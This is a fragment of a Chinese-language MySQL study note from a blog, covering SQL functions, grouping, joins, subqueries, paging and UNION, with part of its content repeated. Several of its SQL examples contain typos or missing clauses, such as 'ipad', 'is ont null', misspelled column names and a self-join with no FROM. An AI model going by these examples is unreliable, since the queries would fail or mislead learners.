length(&#39;str&#39;);</code></pre><ol start=\"2\">\n<li>concat ( ) 拼接函数</li>\n</ol>\n<pre><code>concat(str1, str2 ,..., str n); //拼接字符串字段进行查询，字段之间用逗号隔开\n# 若str中有值为NULL，则查询的所有值为NULL</code></pre><ol start=\"3\">\n<li><p>upper( ), lower( ) :改变大小写</p>\n</li>\n<li><p>substr( ) ：截取字符函数</p>\n</li>\n</ol>\n<pre><code>select substr(&#39;今天买了个大白菜&#39;， 6);\n结果: 大白菜\nselect substr(&#39;今天买了个大白菜&#39;， 3, 4);\n结果: 买了</code></pre><ol start=\"5\">\n<li>instr( ) :返回字串第一个字符的索引，没有则返回0</li>\n</ol>\n<pre><code>select instr(&#39;今天买了个大白菜&#39;， &#39;大白菜&#39;);\n结果：6</code></pre><ol start=\"6\">\n<li>trim( ) :去掉字段中的空格或指定字符</li>\n</ol>\n<pre><code>select trim(&#39;烂的&#39; from &#39;今天买了个烂的大白菜&#39;);\n结果：今天买了个大白菜</code></pre><ol start=\"7\">\n<li><p>lpad( ): 左填充指定长度的字符，</p>\n<p>rpad( ): 右填充指定长度的字符</p>\n</li>\n</ol>\n<pre><code>select ipad(&#39;大白菜&#39;, 6, &#39;*&#39;);\n结果：×××大白菜\nselect rpad(&#39;大白菜&#39;, 6, &#39;*&#39;);\n结果：大白菜×××</code></pre><ol start=\"8\">\n<li>replace 替换</li>\n</ol>\n<pre><code>select replace(&#39;今天买了个大白菜&#39;, &#39;大白菜&#39;, &#39;胡萝卜&#39;);\n结果：今天买了个胡萝卜</code></pre><h6 id=\"二、数学函数\"><a href=\"#二、数学函数\" class=\"headerlink\" title=\"二、数学函数\"></a>二、数学函数</h6><ol>\n<li>round( ) : 四舍五入函数</li>\n</ol>\n<pre><code>select round(1.1236);  //默认保留整数部分\n结果：1\nselect round(1.1236, 3);  //可指定保留小数部分\n结果：1.124</code></pre><ol start=\"2\">\n<li>ceil( ): 向上取整，返回 &gt;= 该函数的最小整数</li>\n<li>floor( ): 向下取整，返回  &lt;= 该函数的最大整数</li>\n</ol>\n<pre><code>select floor(-9.99);\n结果：-10</code></pre><ol start=\"4\">\n<li>truncate 截断函数，截断小数点后指定的位数</li>\n</ol>\n<pre><code>select truncate(1.123, 2);\n结果：1.12</code></pre><ol start=\"5\">\n<li>mod( ): 取模（取余）函数</li>\n</ol>\n<pre><code>select mod(10,3);\n结果：1</code></pre><h6 id=\"三、日期函数\"><a href=\"#三、日期函数\" class=\"headerlink\" title=\"三、日期函数\"></a>三、日期函数</h6><ol>\n<li>now( ) 返回当前系统日期+时间</li>\n<li>curdate( ) 返回当前系统日期，不返回时间</li>\n<li>curtime( ) 返回当前时间，不返回日期</li>\n<li>str_to_date( ) 将日期格式的字符转换成指定格式的日期</li>\n<li>date_format( ) 将日期转换成字符</li>\n</ol>\n<ul>\n<li>更多日期函数请上网搜索</li>\n</ul>\n<h6 id=\"四、流程控制函数\"><a href=\"#四、流程控制函数\" class=\"headerlink\" title=\"四、流程控制函数\"></a>四、流程控制函数</h6><ol>\n<li>if( ) :该函数起到的作用类似与python或C语言中的else if( )函数</li>\n<li>case( )： </li>\n</ol>\n<pre><code>case 要判断的字段或表达式    // 选择函数——判断并选择显示一个\nwhen 常量1 then 要显示的值1或语句1;  //如果显示的是值，则不显示分号 \nwhen 常量2 then 要显示的值2或语句2;\n...\nelse 默认显示的值或语句\nend</code></pre><pre><code>case\nwhen 常量1 then 要显示的值1或语句1;  //如果显示的是值，则不显示分号 \nwhen 常量2 then 要显示的值2或语句2;\n...\nelse 默认显示的值或语句\nend</code></pre><h6 id=\"五、其它函数\"><a href=\"#五、其它函数\" class=\"headerlink\" title=\"五、其它函数\"></a>五、其它函数</h6><ul>\n<li>其他函数太多，用时上网搜</li>\n</ul>\n<h5 id=\"分组函数\"><a href=\"#分组函数\" class=\"headerlink\" title=\"分组函数\"></a>分组函数</h5><ul>\n<li>功能：用作统计使用，又称为聚合函数或统计函数或组函数</li>\n<li>分类：sum 求和， avg 平均值， max， min， count 计算个数</li>\n<li>忽略 NULL值</li>\n<li>可以与distinct( )去重函数或其它函数搭配使用</li>\n<li>count( )详细介绍</li>\n</ul>\n<pre><code>select count(*) from 表单;  //统计总行数</code></pre><ul>\n<li>和分组函数一同查询的字段要求是group by后的字段</li>\n</ul>\n<h4 id=\"4、分组查询\"><a href=\"#4、分组查询\" class=\"headerlink\" title=\"4、分组查询\"></a>4、分组查询</h4><ol>\n<li>语法：</li>\n</ol>\n<pre><code>select 分组函数，列（要求出现在group by的后面）\nfrom 表\n[where 筛选条件]\ngroup by 分组的列表;\n[order by 子句]\n\n// 查询列表必须特殊，要求是分组函数和group by 后出现的字段</code></pre><ul>\n<li>简单的分组查询</li>\n</ul>\n<ol>\n<li>实例一：查询每个工种的最高工资</li>\n</ol>\n<pre><code>select max(salary), job_id\nfrom employees\ngroup by job_id;</code></pre><ol start=\"3\">\n<li>实例二：查询每个位置上的部门个数</li>\n</ol>\n<pre><code>select count(*), location_id\nfrom departments\ngroup by lacation_id;</code></pre><ul>\n<li>添加筛选条件的分组查询</li>\n</ul>\n<ol start=\"4\">\n<li>实例三：查询邮箱中包含a字符的，每个部门的平均工资</li>\n</ol>\n<pre><code>select avg(salsry), department_id\nfrom employees\nwhere email &#39;%a%&#39;\ngroup by department_id;</code></pre><ol start=\"5\">\n<li>实例四：查询有奖金的每个领导手下员工的最高工资</li>\n</ol>\n<pre><code>select max(salary), manager_id\nfrom employees\nwhere commission_pct is ont null\ngroup by manager_id;</code></pre><ul>\n<li>添加复杂筛选条件的分组查询</li>\n<li>分组后进行条件筛选的查询</li>\n</ul>\n<ol start=\"6\">\n<li>实例五：查询哪个部门的员工个数&gt;2</li>\n</ol>\n<pre><code>select count(*), depatment_id\nfrom employees\ngroup by department_id\nhaving count(*)&gt;2;   //用查询的结果再进行筛选时用having</code></pre><h4 id=\"5、连接查询【-优先学习99语法-】\"><a href=\"#5、连接查询【-优先学习99语法-】\" class=\"headerlink\" title=\"5、连接查询【 优先学习99语法 】\"></a>5、连接查询【 优先学习99语法 】</h4><ol>\n<li><p>含义：又称多表查询，当查询的字段来自于多个表时，就会用到连接查询</p>\n</li>\n<li><p>笛卡尔乘积现象：表1有m行，表2有n行，结果有m×n行</p>\n<ol>\n<li>发生原因：没有有效的链接条件</li>\n<li>如何避免：添加有效的连接条件</li>\n</ol>\n</li>\n<li><p>按功能分类：</p>\n<ul>\n<li><p>内连接：等值连接</p>\n<p>​               非等值连接</p>\n<p>​               自连接</p>\n</li>\n<li><p>外连接：左外连接</p>\n<p>​               右外连接</p>\n<p>​               全外连接</p>\n</li>\n<li><p>交叉连接</p>\n</li>\n</ul>\n</li>\n</ol>\n<h5 id=\"SQL92语法\"><a href=\"#SQL92语法\" class=\"headerlink\" title=\"SQL92语法\"></a>SQL92语法</h5><p>(1) 等值查询</p>\n<ul>\n<li>查询员工名和对应的部门名</li>\n</ul>\n<pre><code>select last_name, department_name\nfrom employees, departments\nwhere employees.&#39;department_id=departments.&#39;department_id&#39;;</code></pre><ul>\n<li>多条件筛选连接查询<ul>\n<li>查询有奖金的员工名，部门名</li>\n</ul>\n</li>\n</ul>\n<pre><code>select last_name, department_name, commission_pct\nfrom emplloees e, departments d\nwhere e.&#39;department_id&#39;=d.&#39;department_id&#39;\nand e.&#39;commission_pct&#39; is not null;</code></pre><p>(2) 非等值链接</p>\n<ul>\n<li>在等值链接的基础上将条件改为非等值就行</li>\n</ul>\n<p>(3) 自链接</p>\n<ul>\n<li><p>自己链接自己</p>\n</li>\n<li><p>实例:查询查询一张表中员工名和上级的名称</p>\n</li>\n</ul>\n<pre><code>select e.employee_id, e.last_name, m.employee_id, m.last_name\nfrom employees e, employees m\nwhere e.&#39;manager_id&#39;=m.&#39;employee_id&#39;;</code></pre><h5 id=\"SQL99语法\"><a href=\"#SQL99语法\" class=\"headerlink\" title=\"SQL99语法\"></a>SQL99语法</h5><ul>\n<li><p>语法： select 查询列表</p>\n<p>​            from 表1 别名</p>\n<pre><code>        [连接类型]  join 表2 别名</code></pre><p>​            on 连接条件</p>\n<p>​            where 筛选条件</p>\n<p>​            group by 分组</p>\n<p>​            having 筛选条件</p>\n<p>​            order by 排序条件</p>\n</li>\n</ul>\n<h6 id=\"内链接\"><a href=\"#内链接\" class=\"headerlink\" title=\"内链接\"></a>内链接</h6><ul>\n<li>语法：</li>\n</ul>\n<pre><code>select 查询列表\nfrom 表1 别名\ninner join 表2 别名\non 连接条件；</code></pre><ul>\n<li>分类：</li>\n</ul>\n<pre><code>内链接：inner\n外链接\n    左外：left【outer】  //括号中outer可以省去\n    右外：right 【outer】\n    全外：full 【outer\n交叉连接：cross</code></pre><ol>\n<li>等值查询（内连接）</li>\n</ol>\n<pre><code>案例1 查询员工名、部门名\nselect last_name, department_name\nfrom employees e\ninner join departments d\non e.&#39;department_id&#39; = d.&#39;department_id&#39;;</code></pre><ol start=\"2\">\n<li>非等值连接(内链接)</li>\n</ol>\n<pre><code>案例1：查询员工的工资级别\nselect salary, grdae_level\nfrom employees e\njoin job_grades g\non e.&#39;salary&#39; between g.&#39;lowest_sal&#39; and &#39;highest_sal&#39;;</code></pre><ol start=\"3\">\n<li>自连接（内连接）</li>\n</ol>\n<pre><code>查询员工的名字，上级的名字,包含字符k的\nselect e.last_name, m.last_name\njoin employees m\non e.&#39;manager_id&#39; = m.&#39;employee_id&#39;\nwhere e.&#39;last_name&#39; like &#39;%k%&#39;;</code></pre><h6 id=\"外连接\"><a href=\"#外连接\" class=\"headerlink\" title=\"外连接\"></a>外连接</h6><ul>\n<li>应用场景，一个表格有，一个表格没有</li>\n<li>特点：</li>\n</ul>\n<ol>\n<li><p>外连接的查询结果为主表中的所有记录</p>\n<p>如果从表中有和他匹配的，则显示匹配值</p>\n<p>如果从表中没有和它匹配的值，则显示null</p>\n<p>外连接查询结果=内链接结果+主表中有而从表中没有的记录</p>\n</li>\n<li><p>左外连接，left join左边的是主表</p>\n<p>右外连接，right join右边的是主表</p>\n<p>左外右外和俩个表都换一下顺序，可以实现同样的效果</p>\n</li>\n</ol>\n<ul>\n<li><p>主表：查询内容较多的表格</p>\n</li>\n<li><p>全外连接：全外连接=内连接的结果+表1中有但表2中没有的+表2中有但表1中没有的</p>\n</li>\n</ul>\n<h6 id=\"交叉连接\"><a href=\"#交叉连接\" class=\"headerlink\" title=\"交叉连接\"></a>交叉连接</h6><ul>\n<li>相当于用99语法实现的笛卡尔乘积</li>\n</ul>\n<p>图示：</p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"https://s1.ax1x.com/2020/06/25/NBjOQf.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"NBjOQf.png\"></p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"https://s1.ax1x.com/2020/06/25/NBjXy8.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"NBjXy8.png\"></p>\n<h4 id=\"6、子查询\"><a href=\"#6、子查询\" class=\"headerlink\" title=\"6、子查询\"></a>6、子查询</h4><ol>\n<li>含义：出现在其他语句中的select语句，称为子查询或内查询</li>\n<li>分类：</li>\n</ol>\n<pre><code>按子查询出现的位置：\n        select后面：\n            仅仅支持标量子查询\n        from后面：\n            支持表子查询\n        where或having后面： // 重点\n            标量子查询       //  重点\n            列子查询        // 重点\n            行子查询        // 重点\n        exists后面（相关子查询）\n            表子查询\n按结果集的行列数不同：\n        标量子查询：结果集只有一行一列\n        列子查询：结果集有一列多行\n        行子查询：结果集有一行多列\n        表子查询：结果集有多行多列</code></pre><ul>\n<li>（一）where或having后面</li>\n</ul>\n<ol>\n<li><p>标量子查询（单行子查询）</p>\n</li>\n<li><p>列子查询（多行子查询）</p>\n</li>\n<li><p>行子查询（多行多列）</p>\n</li>\n<li><p>特点：（1）子查询放在小括号内</p>\n<p>​           （2）子查询一般放在条件的右侧</p>\n<p>​            （3）标量子查询，一般搭配着单行操作符使用&lt;  &gt; =   &gt;=  &lt;=等</p>\n<p>​                     列子查询，一般搭配多行操作符使用 in, any,some, all</p>\n<p>​              (4)子查询的执行优先于主查询，因为主查询要用到子查询</p>\n</li>\n<li><p>标量子查询</p>\n</li>\n</ol>\n<pre><code>案例：谁的工资比sam高？\n#查询sam的工资\nselect salary\nfrom employees\nwhere last_name = &#39;sam&#39;；\n\n#查询员工的信息，满足salary &gt; sam工资 的结果\nselect *\nfrom employees\nwhere salary &gt;(\n    select salary\n    from employees      //为更清晰的表达，子查询最好进行缩进\n    where last_name = &#39;sam&#39;  \n)；</code></pre><pre><code>案例：返回公司工资最少的员工的last_name,job_id,salary\n#查询公司的最低工资\nselect min(salary)\nfrom empolyees;\n\n#查询last_name, job_id, salary, 要求salary= 公司的最低工资\nselect last_name, job_id, salary\nfrom employees\nwhere salary=(\n    select min(salary)\n    from empolyees\n);</code></pre><ol start=\"2\">\n<li>列子查询(多行子查询）</li>\n</ol>\n<pre><code>案例：返回location_id是1400或1700的部门中的所有员工姓名\n#查询location_id是1700或1400的部门编号\nselect department_id\nfrom departments\nwhere location_id in(1400, 1700);\n\n#查询员工姓名，要求部门号是上个查询结果中的某一个\nselect employees\nwhere department_id in(\n    select department_id\n    from departments\n    where location_id in(1400, 1700)\n);</code></pre><ol start=\"3\">\n<li><p>行子查询（多行多列）</p>\n<p>略</p>\n</li>\n</ol>\n<ul>\n<li>（二）放在select后面的标量子查询</li>\n</ul>\n<pre><code>案例：查询每个部门的员工个数\nselect d.*, (\n    select count(*)\n    from empolyees e\n    where e.department_id = d.&#39;department_id&#39;\n) 个数\nfrom departments d;</code></pre><ul>\n<li>（三）放在from后面<ul>\n<li>将子查询结果当成一张表，要求必须起别名</li>\n</ul>\n</li>\n</ul>\n<pre><code>案例：查询每个部门的平均工资的平均等级\n#查询每个部门的平均工资\nselect avg(salary), department_id\nfrom employees\ngroup by department_id\n\n#连接上个查询结果集和job_grades表，筛选条件平均工资\nselect ag_dep.*, g.&#39;grade_level&#39;\nfrom(\n    select avg(salary), department_id\n    from employees\n    group by department_id\n) ag_dep\ninner join job_grades g\non ag_dep.ag between lowest_sal and highest_sal;</code></pre><ul>\n<li>（四）放在exists后面（相关子查询）<ul>\n<li>能用exists的都能用in代替</li>\n</ul>\n</li>\n</ul>\n<pre><code>语法：\n    exists 完整的查询语句\n结果：0或1   //返回一个布尔值</code></pre><pre><code>案例：查询员工的部门名\nselect department_name\nfrom departments d\nwhere exists(\n    select *\n    from employees e\n    where d.&#39;department_id&#39;=e.&#39;depaertment_id&#39;\n);</code></pre><h4 id=\"7、分页查询\"><a href=\"#7、分页查询\" class=\"headerlink\" title=\"7、分页查询\"></a>7、分页查询</h4><ol>\n<li>应用场景：当要显示的数据，一页显示不全，需要枫叶提交sql请求</li>\n<li>语法：</li>\n</ol>\n<pre><code>select 查询列表\nfrom 表\n连接类型 join 表2\non 连接条件\nwhere 筛选条件\ngroup by 分组字段\nhaving 分组后的筛选\norder by 排序的字段\nlimit offset, size;\n\noffset要显示条目的起始索引（起始索引从0开始）\nsize 要显示的条目个数</code></pre><ol start=\"3\">\n<li>案例：查询前五条员工信息</li>\n</ol>\n<pre><code>select * from employees limit 0, 5;</code></pre><ol start=\"4\">\n<li>案例2：查询11条—第25条</li>\n</ol>\n<pre><code>select * from employees limit 10, 15;</code></pre><ol start=\"5\">\n<li>案例3：有奖金的员工信息，并且工资较高的前10名显示出来</li>\n</ol>\n<pre><code>select *\nfrom employees\nwhere commission_pic is not null\norder by salsry desc\nlimit 10;</code></pre><ol start=\"6\">\n<li>特点：</li>\n</ol>\n<ul>\n<li>limit语句放在查询语句德尔最后</li>\n<li>公式：要显示的页数page，每页的条目数size</li>\n</ul>\n<pre><code>select 查询列表\nfrom 表\nlimit (page-1)*size, size;</code></pre><h4 id=\"8、联合查询\"><a href=\"#8、联合查询\" class=\"headerlink\" title=\"8、联合查询\"></a>8、联合查询</h4><ol>\n<li>union联合 ：将多个查询语句的结果合并成一个结果</li>\n<li>语法：</li>\n</ol>\n<pre><code>查询语句1\nunion\n查询语句2\nunion\n...</code></pre><ol start=\"3\">\n<li>案例：查询部门编号&gt;90或邮箱包含a的员工信息</li>\n</ol>\n<pre><code>select *\nfrom employees\nwhere email like &#39;%a%&#39; or deaprtment_id&gt;90;\n\nselect *\nfrom employees\nwhere email like &#39;%a%&#39;\nunion\nselect *\nfrom employees\nwhere deparment_id&gt;90;</code></pre><ol start=\"4\">\n<li>特点：</li>\n</ol>\n<ul>\n<li>要求多条查询语句的查询列数是一致的</li>\n<li>要求多条查询语句的查询的每一列的类型和顺序最好一致</li>\n<li>union关键字默认去重，如果使用union all 可以包含重复选项</li>\n</ul>\n","site":{"data":{}},"excerpt":"<h1 id=\"数据库的学习（一）\"><a href=\"#数据库的学习（一）\" class=\"headerlink\" title=\"数据库的学习（一）\"></a>数据库的学习（一）</h1><ul>\n<li><a href=\"https://www.bilibili.com/video/BV12b411K7Zu/?p=28\">相关视频链接</a></li>\n</ul>\n<h2 id=\"数据库及其概念\"><a href=\"#数据库及其概念\" class=\"headerlink\" title=\"数据库及其概念\"></a>数据库及其概念</h2><ul>\n<li>DB 数据库</li>\n<li>DBMS 数据库管理系统，如Mysql， MongoDB 等，用来管理与操作DB</li>\n<li>SQL  管理数据库的语言，几乎被所有的DBMS支持</li>\n<li>DB是大宅子，DBMS是宅子管家，SQL是管家的指挥口令</li>\n</ul>","more":"<h3 id=\"数据库管理的特点\"><a href=\"#数据库管理的特点\" class=\"headerlink\" title=\"数据库管理的特点\"></a>数据库管理的特点</h3><ol>\n<li>先将数据放到 “一张表” 中， 在将表放到仓库中</li>\n<li>一个数据库中存放多张表，每张表都有自己独特的名字，用来标识自己</li>\n<li>数据库中的每张表都有自己的类别，有自己的门派，参照python的  “类”</li>\n<li>表是由列组成，也称为字段，相当与python中的  “属性”</li>\n<li>表是按行储存的，每一行相当与python中的  ”对象“</li>\n</ol>\n<ul>\n<li>端口号port 3306</li>\n</ul>\n<h3 id=\"Linux-系统-Mysql-相关事项\"><a href=\"#Linux-系统-Mysql-相关事项\" class=\"headerlink\" title=\"Linux 系统 Mysql 相关事项\"></a>Linux 系统 Mysql 相关事项</h3><ul>\n<li><p>检查电脑是否存在Mysql ：whereis mysql  或者输入  mysql –version</p>\n</li>\n<li><p>systemctl start mysql.service 启动  或者 service mysql start<br>systemctl stop mysql.service 停止  或者 service mysql stop<br>systemctl restart mysql.service 重启</p>\n</li>\n<li><p>检查电脑是否启动或关闭数据库：ps aux | grep mysqld  或者  pidof mysqld<br><a href=\"https://blog.csdn.net/qq_31083947/article/details/90248565\">相关检查操作链接</a></p>\n</li>\n</ul>\n<h3 id=\"数据库常用命令\"><a href=\"#数据库常用命令\" class=\"headerlink\" title=\"数据库常用命令\"></a>数据库常用命令</h3><ol>\n<li>进入管理系统时时查看有那些数据库</li>\n</ol>\n<pre><code>show databases;</code></pre><ol start=\"2\">\n<li>进入库</li>\n</ol>\n<pre><code>use 库的名称;</code></pre><ol start=\"3\">\n<li>查看库里有哪些表</li>\n</ol>\n<pre><code>show tables;</code></pre><ol start=\"4\">\n<li>从现在所在的库中查看别的库中存有的表</li>\n</ol>\n<pre><code>show tables from 库的名称;</code></pre><ol start=\"5\">\n<li>查看现在在哪个库</li>\n</ol>\n<pre><code>select database();</code></pre><ol start=\"6\">\n<li>查看表的内容</li>\n</ol>\n<pre><code>desc 表的名称;</code></pre><ol start=\"7\">\n<li>创建表</li>\n</ol>\n<pre><code>create table 表名（\n    列名 列类型，\n    列名 列类型，\n    ...\n)</code></pre><h3 id=\"SQL语法规范\"><a href=\"#SQL语法规范\" class=\"headerlink\" title=\"SQL语法规范\"></a>SQL语法规范</h3><ol>\n<li>不区分大小写，但建议关键字大写，表名，列名小写</li>\n<li>每行命令u最好用分号结尾</li>\n<li>每行命令根据需要，可以进行缩进，或换行</li>\n<li>SQL语法中索引从1开始</li>\n<li>注释 </li>\n</ol>\n<ul>\n<li>单行注释：#注释文字</li>\n<li>单行注释：– 注释文字（注意横杠后面有空格）</li>\n<li>多行注释：/× 注释文字 ×/</li>\n</ul>\n<h3 id=\"使用-DBMS-图形化界面以及命令行登录时出现错误解决\"><a href=\"#使用-DBMS-图形化界面以及命令行登录时出现错误解决\" class=\"headerlink\" title=\"使用 DBMS 图形化界面以及命令行登录时出现错误解决\"></a>使用 DBMS 图形化界面以及命令行登录时出现错误解决</h3><ul>\n<li><a href=\"https://www.cnblogs.com/leolztang/p/5094930.html\">原文链接</a></li>\n</ul>\n<pre><code>~$ mysql -u root -p\nEnter password: \nERROR 1698 (28000): Access denied for user &#39;root&#39;@&#39;localhost&#39;</code></pre><ul>\n<li>解决</li>\n</ul>\n<pre><code># 强制登录\nsudo mysql\n\nselect user, plugin from mysql.user;\n\nupdate mysql.user set authentication_string=PASSWORD(&#39;hero1314&#39;), plugin=&#39;mysql_native_password&#39; where user=&#39;root&#39;;\n\nflush privileges;\n\nsudo service mysql restart</code></pre><h2 id=\"数据库语言的学习\"><a href=\"#数据库语言的学习\" class=\"headerlink\" title=\"数据库语言的学习\"></a>数据库语言的学习</h2><h3 id=\"DQL语言的学习\"><a href=\"#DQL语言的学习\" class=\"headerlink\" title=\"DQL语言的学习\"></a>DQL语言的学习</h3><h4 id=\"1、基础查询\"><a href=\"#1、基础查询\" class=\"headerlink\" title=\"1、基础查询\"></a>1、基础查询</h4><ul>\n<li>语法</li>\n</ul>\n<pre><code>select 查询列表 from 表名;</code></pre><ul>\n<li>特点：</li>\n</ul>\n<ol>\n<li>查询列表可以是：表中的字段，常量值，表达式，函数</li>\n<li>查询结果是一个虚拟的表格，只是将结果用表格呈现出来而已</li>\n</ol>\n<ul>\n<li>查询字段</li>\n</ul>\n<pre><code>select 字段一，字段二 from 表格;    //字段之间用逗号隔开\nselect * from 表格;  // 查询所有字段</code></pre><ul>\n<li><p>着重号 `  （1的旁边的那个），用来标识字段</p>\n</li>\n<li><p>查询常量值：select ‘ 字符或字符串 ’ ;</p>\n</li>\n<li><p>起别名</p>\n<p>​    别名有空格时，应用空格将别名括起来</p>\n<p>​    注意：如果为表起了别名，则查询的字段就不能使用原来的表名去限定 </p>\n</li>\n</ul>\n<pre><code>select 字段值 as 别名;  // as可以省略</code></pre><ul>\n<li>去重：在被查询的字段之前加上关键字 distinct</li>\n<li>+ 号的作用</li>\n</ul>\n<pre><code>select 100+90; // 俩个操作数都为数值型，则做加法运算\n# 结果：190\nselect &#39;100&#39;+90;  // 俩个数中若有一方为字符串，则将进行转换，若转换成功，则将继续做加法运算，若转换失败，则将字符型数值转换成再在进行加法运算\n# 结果：190\nselect null+10; //若有一个方为null，则结果肯定为null</code></pre><ul>\n<li>ifnull( ) 函数</li>\n</ul>\n<pre><code>select IFNULL(字段，0) as 别名; //若该字段真未NULL，则输出0,否则则输出该字段的值</code></pre><h4 id=\"2、条件查询\"><a href=\"#2、条件查询\" class=\"headerlink\" title=\"2、条件查询\"></a>2、条件查询</h4><ul>\n<li>语法：</li>\n</ul>\n<pre><code>select 查询列表 from 表名 where 筛选条件;</code></pre><ul>\n<li>分类：</li>\n</ul>\n<ol>\n<li><p>按表达条件筛选：</p>\n<p>​        逻辑运算符：&gt; , &lt;, =, &lt;&gt; , &lt;=, &gt;=</p>\n<p>​        注意：&lt;&gt;为不等于的意思</p>\n</li>\n<li><p>按逻辑表达式筛选：</p>\n<p>​        &amp;&amp;， ||， ！</p>\n<p>​        and，or，not   // SQL推荐使用</p>\n</li>\n<li><p>模糊查询</p>\n<p>​        like, between and, in, is null</p>\n<ul>\n<li>between and 等价与  &gt;=  and &lt;=</li>\n</ul>\n<p>模糊查询通常与通配符一起使用  (in 不支持)</p>\n<ul>\n<li><p>常见通配符：% 匹配任意一个或零个</p>\n<p>​                     _  (下划线) 匹配任意一个</p>\n<ul>\n<li>支持对通配符进行转义</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<pre><code>select 字段 from 表名 where like &#39;_$_&#39; escape &#39;$&#39;; //使用$符号对下划线进行转义</code></pre><pre><code>select × from 表名 where like %a%;</code></pre><ol start=\"4\">\n<li>安全等于  &lt;=&gt; : 可以判断显示NULL</li>\n</ol>\n<h4 id=\"3、排序查询\"><a href=\"#3、排序查询\" class=\"headerlink\" title=\"3、排序查询\"></a>3、排序查询</h4><ul>\n<li>语法：</li>\n</ul>\n<pre><code>select 字段\nfrom 表\nwhere 筛选条件\norder by 排序列表 asc|desc   //不写关键字，默认是asc\n# asc 从低到高 （升序）\n# desc 从高到底 （降序）</code></pre><ul>\n<li>支持别名排序， 运算表达式排序</li>\n<li>支持对多个列表进行先后排序查询，列表间用逗号隔开</li>\n<li>排序语句一般是放在查询语句的最后面</li>\n</ul>\n<h4 id=\"常见函数\"><a href=\"#常见函数\" class=\"headerlink\" title=\"常见函数\"></a>常见函数</h4><ul>\n<li>类似python中的方法</li>\n<li>函数可以嵌套使用</li>\n<li>分类：</li>\n</ul>\n<ol>\n<li>单行函数：concat, length, ifnull等</li>\n<li>分组函数：<ul>\n<li>功能：做统计使用，又称为统计函数，聚合函数，组函数</li>\n</ul>\n</li>\n</ol>\n<h5 id=\"单行函数\"><a href=\"#单行函数\" class=\"headerlink\" title=\"单行函数\"></a>单行函数</h5><h6 id=\"一、字符函数\"><a href=\"#一、字符函数\" class=\"headerlink\" title=\"一、字符函数\"></a>一、字符函数</h6><ol>\n<li>length </li>\n</ol>\n<pre><code>select length(&#39;str&#39;);</code></pre><ol start=\"2\">\n<li>concat ( ) 拼接函数</li>\n</ol>\n<pre><code>concat(str1, str2 ,..., str n); //拼接字符串字段进行查询，字段之间用逗号隔开\n# 若str中有值为NULL，则查询的所有值为NULL</code></pre><ol start=\"3\">\n<li><p>upper( ), lower( ) :改变大小写</p>\n</li>\n<li><p>substr( ) ：截取字符函数</p>\n</li>\n</ol>\n<pre><code>select substr(&#39;今天买了个大白菜&#39;， 6);\n结果: 大白菜\nselect substr(&#39;今天买了个大白菜&#39;， 3, 4);\n结果: 买了</code></pre><ol start=\"5\">\n<li>instr( ) :返回字串第一个字符的索引，没有则返回0</li>\n</ol>\n<pre><code>select instr(&#39;今天买了个大白菜&#39;， &#39;大白菜&#39;);\n结果：6</code></pre><ol start=\"6\">\n<li>trim( ) :去掉字段中的空格或指定字符</li>\n</ol>\n<pre><code>select trim(&#39;烂的&#39; from &#39;今天买了个烂的大白菜&#39;);\n结果：今天买了个大白菜</code></pre><ol start=\"7\">\n<li><p>lpad( ): 左填充指定长度的字符，</p>\n<p>rpad( ): 右填充指定长度的字符</p>\n</li>\n</ol>\n<pre><code>select ipad(&#39;大白菜&#39;, 6, &#39;*&#39;);\n结果：×××大白菜\nselect rpad(&#39;大白菜&#39;, 6, &#39;*&#39;);\n结果：大白菜×××</code></pre><ol start=\"8\">\n<li>replace 替换</li>\n</ol>\n<pre><code>select replace(&#39;今天买了个大白菜&#39;, &#39;大白菜&#39;, &#39;胡萝卜&#39;);\n结果：今天买了个胡萝卜</code></pre><h6 id=\"二、数学函数\"><a href=\"#二、数学函数\" class=\"headerlink\" title=\"二、数学函数\"></a>二、数学函数</h6><ol>\n<li>round( ) : 四舍五入函数</li>\n</ol>\n<pre><code>select round(1.1236);  //默认保留整数部分\n结果：1\nselect round(1.1236, 3);  //可指定保留小数部分\n结果：1.124</code></pre><ol start=\"2\">\n<li>ceil( ): 向上取整，返回 &gt;= 该函数的最小整数</li>\n<li>floor( ): 向下取整，返回  &lt;= 该函数的最大整数</li>\n</ol>\n<pre><code>select floor(-9.99);\n结果：-10</code></pre><ol start=\"4\">\n<li>truncate 截断函数，截断小数点后指定的位数</li>\n</ol>\n<pre><code>select truncate(1.123, 2);\n结果：1.12</code></pre><ol start=\"5\">\n<li>mod( ): 取模（取余）函数</li>\n</ol>\n<pre><code>select mod(10,3);\n结果：1</code></pre><h6 id=\"三、日期函数\"><a href=\"#三、日期函数\" class=\"headerlink\" title=\"三、日期函数\"></a>三、日期函数</h6><ol>\n<li>now( ) 返回当前系统日期+时间</li>\n<li>curdate( ) 返回当前系统日期，不返回时间</li>\n<li>curtime( ) 返回当前时间，不返回日期</li>\n<li>str_to_date( ) 将日期格式的字符转换成指定格式的日期</li>\n<li>date_format( ) 将日期转换成字符</li>\n</ol>\n<ul>\n<li>更多日期函数请上网搜索</li>\n</ul>\n<h6 id=\"四、流程控制函数\"><a href=\"#四、流程控制函数\" class=\"headerlink\" title=\"四、流程控制函数\"></a>四、流程控制函数</h6><ol>\n<li>if( ) :该函数起到的作用类似与python或C语言中的else if( )函数</li>\n<li>case( )： </li>\n</ol>\n<pre><code>case 要判断的字段或表达式    // 选择函数——判断并选择显示一个\nwhen 常量1 then 要显示的值1或语句1;  //如果显示的是值，则不显示分号 \nwhen 常量2 then 要显示的值2或语句2;\n...\nelse 默认显示的值或语句\nend</code></pre><pre><code>case\nwhen 常量1 then 要显示的值1或语句1;  //如果显示的是值，则不显示分号 \nwhen 常量2 then 要显示的值2或语句2;\n...\nelse 默认显示的值或语句\nend</code></pre><h6 id=\"五、其它函数\"><a href=\"#五、其它函数\" class=\"headerlink\" title=\"五、其它函数\"></a>五、其它函数</h6><ul>\n<li>其他函数太多，用时上网搜</li>\n</ul>\n<h5 id=\"分组函数\"><a href=\"#分组函数\" class=\"headerlink\" title=\"分组函数\"></a>分组函数</h5><ul>\n<li>功能：用作统计使用，又称为聚合函数或统计函数或组函数</li>\n<li>分类：sum 求和， avg 平均值， max， min， count 计算个数</li>\n<li>忽略 NULL值</li>\n<li>可以与distinct( 